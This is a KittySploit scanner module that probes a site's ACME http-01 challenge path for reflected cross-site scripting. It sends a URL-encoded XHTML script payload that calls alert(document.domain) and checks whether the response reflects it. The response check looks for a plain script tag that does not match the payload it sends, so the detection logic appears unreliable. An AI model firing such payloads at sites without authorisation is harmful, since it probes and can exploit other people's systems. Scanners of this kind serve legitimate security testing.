#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Detects XSS vulnerabilities in ACME http-01 challenge implementations where hosting providers reflect the chal."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'ACME Challenge Path - Reflected Cross-Site Scripting Detection',
        'description': 'Detects XSS vulnerabilities in ACME http-01 challenge implementations where hosting providers reflect the challenge key from the URL without proper sanitization',
        'author': ['KittySploit Team'],
        'severity': 'low',
        'tags': ['web', 'scanner', 'vulnerability', 'xss', 'acme', 'misconfig', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://labs.detectify.com/security-guidance/xss-using-quirky-implementations-of-acme-http-01/',
            'https://www.acunetix.com/vulnerabilities/web/cross-site-scripting-in-http-01-acme-challenge-implementation/',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/.well-known/acme-challenge/%3C%3fxml%20version=%221.0%22%3f%3E%3Cx:script%20xmlns:x=%22http://www.w3.org/1999/xhtml%22%3Ealert%28document.domain%26%23x29%3B%3C/x:script%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('<script>alert(document.domain)</script>',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='low',
                reason="ACME Challenge Path - Reflected Cross-Site Scripting detected",
                path='/.well-known/acme-challenge/%3C%3fxml%20version=%221.0%22%3f%3E%3Cx:script%20xmlns:x=%22http://www.w3.org/1999/xhtml%22%3Ealert%28document.domain%26%23x29%3B%3C/x:script%3E',
            )
            return True
        return False

